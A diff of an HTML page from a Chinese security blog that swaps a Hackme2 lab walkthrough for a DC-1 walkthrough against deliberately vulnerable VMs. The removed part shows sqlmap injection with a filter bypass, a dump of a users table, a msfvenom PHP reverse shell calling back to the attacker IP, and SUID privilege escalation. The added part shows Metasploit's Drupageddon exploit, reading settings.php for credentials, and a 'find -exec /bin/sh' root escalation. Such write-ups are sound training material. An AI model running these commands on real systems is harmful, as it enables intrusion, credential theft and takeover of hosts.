@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>Hackme2   | magisec网络安全博客</title>
+  <title>DC-1   | magisec网络安全博客</title>
 
   
     <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
@@ -84,79 +84,50 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Hackme2</div>
+      <div class="post-title">DC-1</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2020-12-29
+          2020-12-30
         </span>
         
       </div>
       <div class="markdown-body">
-        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.132.140</p>
-<p>靶机IP：192.168.132.139</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap探测端口"><a href="#Nmap探测端口" class="headerlink" title="Nmap探测端口"></a>Nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -p- 192.168.132.139 -oN hackme2.nmap</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa83a32c43" alt="image-20201225095131102"></p>
-<p>开放端口：22 80</p>
-<p>系统： ubuntu</p>
+        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
+<p>靶机IP：192.168.56.127</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-1 192.168.56.127</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd1418ce3f" alt="image-20201227204111900"></p>
+<p>开放端口：22 80 111 50742</p>
 <p>22 ssh</p>
 <p>80 web</p>
-<p>渗透思路：80端口getshell</p>
-<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开网站查看</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.132.139&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa840638f9" alt="image-20201225095436788"></p>
-<p>先注册一个用户</p>
-<p><img src="https://img.rruu.net/image/5feaa844ceb3e" alt="image-20201225095446968"></p>
-<p>输入密码登录页面</p>
-<p><img src="https://img.rruu.net/image/5feaa84a1eefa" alt="image-20201225095614724"></p>
-<p>我们打开burpsuite测试，抓包输入框，手工查找注入。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.132.139&#x2F;welcome.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa84f48cf7" alt="image-20201225095904120"></p>
-<h3 id="手工挖掘SQL注入"><a href="#手工挖掘SQL注入" class="headerlink" title="手工挖掘SQL注入"></a>手工挖掘SQL注入</h3><p>使用burpsuite抓包，action到repeater模块，进行重放测试。经过测试我们可以使用/**/干扰他的正则判断，所以我们使用sqlmap自带的脚本，space2comment.py</p>
-<p><img src="https://img.rruu.net/image/5feaa85462077" alt="image-20201225120006529"></p>
-<p>返回错误</p>
-<p><img src="https://img.rruu.net/image/5feaa85a73caa" alt="image-20201225120029971"></p>
-<h3 id="SQLmap检测SQL注入漏洞"><a href="#SQLmap检测SQL注入漏洞" class="headerlink" title="SQLmap检测SQL注入漏洞"></a>SQLmap检测SQL注入漏洞</h3><p>使用sqlmap检测</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --tamper&#x3D;space2comment.py  --prefix&#x3D;&quot;%&#39;&quot; --suffix&#x3D;&quot;%23&quot; -p search</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa85f443b1" alt="image-20201225120118689"></p>
-<p>查看数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --tamper&#x3D;space2comment.py  --prefix&#x3D;&quot;%&#39;&quot; --suffix&#x3D;&quot;%23&quot; -p search --dbs</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa86409c6d" alt="image-20201225123411576"></p>
-<p>查找数据表</p>
-<p><img src="https://img.rruu.net/image/5feaa869cfdcd" alt="image-20201225123451770"></p>
-<p>直接dump user表所有数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --tamper&#x3D;space2comment.py  --prefix&#x3D;&quot;%&#39;&quot; --suffix&#x3D;&quot;%23&quot; -p search -D &quot;webapphacking&quot; -T &quot;users&quot; --dump</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa86e1e138" alt="image-20201225123606588"></p>
-<p>将superadmin解密 Uncrackable，使用superadmin登录。</p>
-<p><img src="https://img.rruu.net/image/5feaa87358e0b" alt="image-20201225123732560"></p>
-<h3 id="代码执行挖掘与绕过"><a href="#代码执行挖掘与绕过" class="headerlink" title="代码执行挖掘与绕过"></a>代码执行挖掘与绕过</h3><p>上传文件无法突破，采用的是很严格。故采取挖掘其他地方。</p>
-<p><img src="https://img.rruu.net/image/5feaa87853d0c" alt="image-20201228122705032"></p>
-<p>msf生成phpshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.132.140 lport&#x3D;9000 -f raw &gt; 1.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa87d3da4b" alt="image-20201228122745360"></p>
-<p>将phpshell base64加密，他这里会把这个lname过滤，我们使用这个fname的参数绕过过滤。将php shell写入linux。</p>
-<p><img src="https://img.rruu.net/image/5feaa881be22b" alt="image-20201228123143150"></p>
-<p>写入成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa886ee867" alt="image-20201228123235670"></p>
-<p>msf设置会话监听</p>
-<p><img src="https://img.rruu.net/image/5feaa88ccd264" alt="image-20201228123352237"></p>
-<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa89286e96" alt="image-20201228124523839"></p>
-<h3 id="二进制文件-suid提权"><a href="#二进制文件-suid提权" class="headerlink" title="二进制文件 suid提权"></a>二进制文件 suid提权</h3><p>查找suid权限文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
-<p>发现异常文件</p>
-<p><img src="https://img.rruu.net/image/5feaa8978328e" alt="image-20201228124601838"></p>
-<p>直接运行，获取root权限，这没有一点难度。。。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;legacy&#x2F;touchmenot</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5feaa89c07f3d" alt="image-20201228124624224"></p>
+<p>111 rpcbind</p>
+<p>50742 rpc</p>
+<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.127</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd14768c0e" alt="image-20201227204704906"></p>
+<h3 id="whatweb识别cms"><a href="#whatweb识别cms" class="headerlink" title="whatweb识别cms"></a>whatweb识别cms</h3><p>发现是drupal，经验告诉我这个站可以直接用msfgetshell回来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:&#x2F;&#x2F;192.168.56.127&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd14d06a97" alt="image-20201227204652909"></p>
+<h3 id="msf利用drupal漏洞"><a href="#msf利用drupal漏洞" class="headerlink" title="msf利用drupal漏洞"></a>msf利用drupal漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd152c3e98" alt="image-20201227205208904"></p>
+<p>设置一下msf</p>
+<p><img src="https://img.rruu.net/image/5febd159d402b" alt="image-20201227205229207"></p>
+<p>直接run返回会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd160eaaf2" alt="image-20201227205317319"></p>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="收集主机信息"><a href="#收集主机信息" class="headerlink" title="收集主机信息"></a>收集主机信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sites\default\settings.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd166ae061" alt="image-20201227205703482"></p>
+<h3 id="suid-find提权"><a href="#suid-find提权" class="headerlink" title="suid find提权"></a>suid find提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd16c7aaee" alt="image-20201227210424566"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5febd17498855" alt="image-20201227210445706"></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/12/29/Five86-2/" target="_self">
+              <a href="/2020/12/29/Hackme2/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -165,13 +136,13 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2020-12-29
+              2020-12-30
             </span>
             
           </div>
           <div class="post-foot-prev">
             
-              <a href="/2020/12/30/DC-1/" target="_self">
+              <a href="/2020/12/30/DC-2/" target="_self">
                 <span>Next</span>
                 <i class="iconfont icon-chevronright"></i>
               </a>
@@ -184,7 +155,7 @@
   <div class="post-catalog" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">Nmap探测端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">手工挖掘SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLmap%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQLmap检测SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%8C%96%E6%8E%98%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">代码执行挖掘与绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%88%87%E6%8D%A2bash"><span class="toc-text">python切换bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6-suid%E6%8F%90%E6%9D%83"><span class="toc-text">二进制文件 suid提权</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-text">nmap扫描端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb%E8%AF%86%E5%88%ABcms"><span class="toc-text">whatweb识别cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%88%A9%E7%94%A8drupal%E6%BC%8F%E6%B4%9E"><span class="toc-text">msf利用drupal漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">收集主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-find%E6%8F%90%E6%9D%83"><span class="toc-text">suid find提权</span></a></li></ol></li></ol>
     </div>
   </div>
 
